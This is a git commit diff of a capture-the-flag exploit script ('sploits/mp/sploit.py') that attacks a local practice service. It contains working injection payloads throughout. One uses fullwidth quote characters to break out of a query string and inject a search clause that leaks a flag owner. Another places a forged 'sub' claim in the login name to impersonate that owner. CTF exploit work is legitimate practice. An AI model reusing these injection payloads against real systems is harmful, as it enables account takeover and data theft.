3992863ed49160fd3fa84b093304ed015ee4f3c2
Konstantin Plotnikov <kostteg@gmail.com>
2021-12-08 05:24:12 +0500

    [mp] sploit minor fixes

--- sploits/mp/sploit.py
+++ sploits/mp/sploit.py
@@ -6,13 +6,12 @@ import re
 
 letters = string.ascii_lowercase
 
-public_flag_id = "5eafae42ee77462388b5f208a0f916db"
+public_flag_id = "5eafae42ee77462388b5f208a0f916db" # PUT here your public flag id
 
 
 phase_1_payload = "*＂}},{＂has_child＂:{＂type＂:＂order＂,＂query＂:{＂term＂:{＂text＂:＂" + public_flag_id + "＂}},＂score_mode＂:＂min"
 login = ''.join(random.choice(letters) for i in range(10))
 password = ''.join(random.choice(letters) for i in range(10))
-
 s = requests.session()
 s.post("http://127.0.0.1/Users/register", json={"login": login, "password": password})
 s.post("http://127.0.0.1/Users/login", json={"login": login, "password": password})
@@ -24,9 +23,7 @@ print("got product creator: " + creator)
 
 
 
-
 phase_2_payload = prefix + "＂,＂sub＂:＂" + creator
-
 prefix = ''.join(random.choice(letters) for i in range(10))
 s.post("http://127.0.0.1/Users/register", json={"login": phase_2_payload, "password": password})
 s.post("http://127.0.0.1/Users/login", json={"login": phase_2_payload, "password": password})
